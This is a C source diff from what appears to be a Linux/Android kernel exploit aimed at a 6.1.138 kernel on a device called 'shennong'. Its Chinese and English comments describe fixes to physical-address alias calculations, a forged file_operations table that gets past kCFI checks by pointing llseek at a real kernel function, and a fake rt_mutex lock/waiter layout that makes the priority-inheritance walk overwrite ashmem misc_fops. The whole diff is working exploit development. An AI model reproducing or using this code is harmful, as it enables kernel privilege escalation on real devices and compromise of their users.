@@ -266,11 +266,23 @@ int has_zero_byte(uintptr_t value) {
 uintptr_t p0_data_alias(uintptr_t image_addr) {
   uintptr_t off = image_addr - KIMAGE_TEXT_BASE;
   uintptr_t phys = P0_KERNEL_PHYS_LOAD + off;
-  return ((phys - P0_PHYS_OFFSET) | P0_PAGE_OFFSET);
+  /* Linear-map alias of the symbol's TRUE physical page. The old
+   * `(phys - P0_PHYS_OFFSET) | P0_PAGE_OFFSET` assumed the kernel image is
+   * loaded at P0_PHYS_OFFSET (0x80000000); on shennong it is loaded at
+   * P0_KERNEL_PHYS_LOAD (0xa8000000), so that formula landed 128MB below
+   * the real page and the W1 write (via data_addr) never reached the page
+   * the kernel reads via its canonical VA -> step=4 on every attempt. */
+  return P0_PAGE_OFFSET + phys;
 }
 
 uintptr_t p0_alias_image_offset(uintptr_t data_alias) {
-  return (data_alias - P0_PAGE_OFFSET) - P0_KERNEL_PHYS_DELTA;
+  /* 必须是 p0_data_alias 的严格逆运算:
+   *   data_alias = P0_PAGE_OFFSET + (P0_KERNEL_PHYS_LOAD + (image - KIMAGE_TEXT_BASE))
+   *   => image = KIMAGE_TEXT_BASE + (data_alias - P0_PAGE_OFFSET) - P0_KERNEL_PHYS_LOAD
+   * 旧写法用 P0_KERNEL_PHYS_DELTA (= PHYS_LOAD - PHYS_OFFSET = 0x28000000) 会少
+   * 减 P0_PHYS_OFFSET(0x80000000), 逆算出的 image 偏移错 128MB, 经此路径的
+   * slide_canon_addr 还原地址也会错位。 */
+  return (data_alias - P0_PAGE_OFFSET) - P0_KERNEL_PHYS_LOAD;
 }
 
 uintptr_t data_addr(uintptr_t image_addr) {
@@ -306,8 +318,12 @@ void put32(unsigned char *p, size_t off, uint32_t value) {
 
 void put_fake_fops_table(unsigned char *p, size_t off) {
   put64(p, off + FOPS_OWNER_OFF, 0);
-  put64(p, off + FOPS_LLSEEK_OFF,
-        fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF);
+  /* CFI 防伪: llseek 槽必须指向真实内核函数,其入口前 4 字节自带正确的
+   * kCFI 类型哈希(#e61887de)。原先填 fake_w0+FAKE_WAITER_PI_TREE_ENTRY_OFF
+   * (喷页假地址),前 4 字节是垃圾 -> 内核走 f_op->llseek 时 kCFI 比对失败
+   * 直接 panic,卡在第 2 关。改成真实 noop_llseek 后,假钥匙牌与该槽
+   * 标记同构;后续 repair_fake_fops_llseek 写回同一值,语义不变。 */
+  put64(p, off + FOPS_LLSEEK_OFF, text_addr(NOOP_LLSEEK));
   put64(p, off + FOPS_READ_OFF, 0);
   put64(p, off + FOPS_WRITE_OFF, 0);
   put64(p, off + FOPS_READ_ITER_OFF, text_addr(CONFIGFS_READ_ITER));
@@ -472,24 +488,44 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
   fake_w0 = payload_base + W0_OFF;
   fake_task = payload_base + FAKE_TASK_OFF;
   fake_fops = payload_base + FOPS_TABLE_OFF;
-  if (payload_mode == PAGE_PAYLOAD_FOPS) {
+  int deep_walk = (payload_mode == PAGE_PAYLOAD_FOPS);
+  uintptr_t write_pc = fake_fops;
+  uintptr_t write_right = 0;
+  uintptr_t write_left = 0;
+  uint64_t waiter_task = text_addr(INIT_TASK);
+  uint64_t task_group = text_addr(ROOT_TASK_GROUP);
+  uint64_t pi_top_task = text_addr(INIT_TASK);
+  if (deep_walk) {
+    /* 第 2 关 FOPS(W1 写路线): 严格对齐已验证上游(Poc-Analysis 真机验证)。
+     * p0_data_alias 修正后 data_addr 与 canon_addr 已指向同一物理页, 故
+     * W1 写目标统一用 data_addr(ASHMEM_MISC_FOPS), 与 try_cfi_stage 的读
+     * 同族, 不再有"写经 data_addr、读经 canon_addr"的错位。
+     * waiter_task / task_group / pi_top_task 必须用真实内核对象
+     * (INIT_TASK / ROOT_TASK_GROUP): 之前误用页内 fake_task, 会让
+     * rt_mutex_setprio 走 __task_rq_lock(fake_task) 直接 panic, 或使 PI
+     * 链 walk 不进入 dequeue/W1, 假 fops 指针写不进 misc_fops -> step=4。 */
     fake_parent = fake_fops;
     fake_right = data_addr(ASHMEM_MISC_FOPS);
     fake_left = 0;
     binwrite_target = payload_base + SCRATCH_OFF;
+    write_pc = fake_fops;
+    write_right = data_addr(ASHMEM_MISC_FOPS);
+    write_left = 0;
+    waiter_task = text_addr(INIT_TASK);
+    task_group = text_addr(ROOT_TASK_GROUP);
+    pi_top_task = text_addr(INIT_TASK);
   } else {
     fake_parent = data_addr(ASHMEM_MISC_FOPS) - 8;
     fake_right = fake_fops;
     fake_left = payload_base + LEFT_OFF;
     binwrite_target = payload_base + FOPS_OFF + 0x700;
+    write_pc = fake_fops;
+    write_right = data_addr(ASHMEM_MISC_FOPS);
+    write_left = 0;
+    waiter_task = text_addr(INIT_TASK);
+    task_group = text_addr(ROOT_TASK_GROUP);
+    pi_top_task = text_addr(INIT_TASK);
   }
-
-  uintptr_t write_pc = fake_fops;
-  uintptr_t write_right = data_addr(ASHMEM_MISC_FOPS);
-  uintptr_t write_left = 0;
-  uint64_t waiter_task = text_addr(INIT_TASK);
-  uint64_t task_group = text_addr(ROOT_TASK_GROUP);
-  uint64_t pi_top_task = text_addr(INIT_TASK);
   if (payload_mode == PAGE_PAYLOAD_SLIDE) {
     write_pc = SLIDE_LOGGERS_0_1;
     write_right = 0;
@@ -508,13 +544,14 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
       put64(p, LOCK_OFF + 0x10, 0);
       put64(p, LOCK_OFF + 0x18, 0);
     } else {
+      /* 第 2 关 FOPS 路径(非 SLIDE 即 FOPS): owner 必须 = fake_task|1。
+       * 若为 NULL, rt_mutex_adjust_prio_chain 走 "lock is free" 早退,
+       * rb_erase/W1 永不执行, 假 fops 写不进 misc_fops -> step=4;
+       * fake_task|1 让 walk 深入 dequeue/enqueue 链, 触发 W1 写入。
+       * (SLIDE 早退路径在上方单独分支, owner=0。) */
       put64(p, LOCK_OFF + 0x08, fake_w0);
       put64(p, LOCK_OFF + 0x10, fake_w0);
-      /* owner 必须 NULL(slide 真机验证布局): 非 NULL 时 adjust_prio_chain
-       * 不走 [9] 干净退出,继续沿 fake_task 的 PI 链深入 -> panic。
-       * walk 尾段 wake_up_state(鬼标签->task=fake_task,3): fake_task 全 0
-       * 种子(__state=0)让 ttwu 早退。 */
-      put64(p, LOCK_OFF + 0x18, 0);
+      put64(p, LOCK_OFF + 0x18, fake_task | 1);
     }
 
     /* 6.1 legacy rt_mutex_waiter layout (BTF verified on shennong 6.1.138):
